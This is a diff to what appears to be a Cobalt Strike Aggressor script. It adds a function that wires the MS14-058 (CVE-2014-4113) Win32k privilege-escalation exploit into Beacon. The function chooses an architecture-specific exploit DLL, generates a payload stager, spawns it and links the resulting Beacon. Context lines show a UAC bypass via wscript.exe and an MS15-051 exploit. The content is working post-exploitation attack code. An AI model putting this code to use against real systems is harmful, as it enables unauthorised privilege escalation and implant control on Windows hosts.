@@ -68,6 +68,36 @@ sub wscript_elevator {
 
 beacon_elevator_register("uac-wscript", "Bypass UAC with wscript.exe", &wscript_elevator);
 
+# Integrate windows/local/ms14_058_track_popup_menu from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms14_058_track_popup_menu.rb
+sub ms14_058_exploit {
+	local('$stager $arch $dll');
+
+	# acknowledge this command
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms14-058", "T1068");
+
+	# tune our parameters based on the target arch
+	if (-is64 $1) {
+		$arch   = "x64";
+		$dll    = getFileProper(script_resource("modules"), "cve-2014-4113.x64.dll");
+	}
+	else {
+		$arch   = "x86";
+		$dll    = getFileProper(script_resource("modules"), "cve-2014-4113.x86.dll");
+	}
+
+	# generate our shellcode
+	$stager = payload($2, $arch);
+
+	# spawn a Beacon post-ex job with the exploit DLL
+	bdllspawn!($1, $dll, $stager, "ms14-058", 5000);
+
+	# link to our payload if it's a TCP or SMB Beacon
+	beacon_link($1, $null, $2);
+}
+
+beacon_exploit_register("ms14-058", "TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)", &ms14_058_exploit);
+
 # Integrate windows/local/ms15_051_client_copy_image from Metasploit
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
 sub ms15_051_exploit {
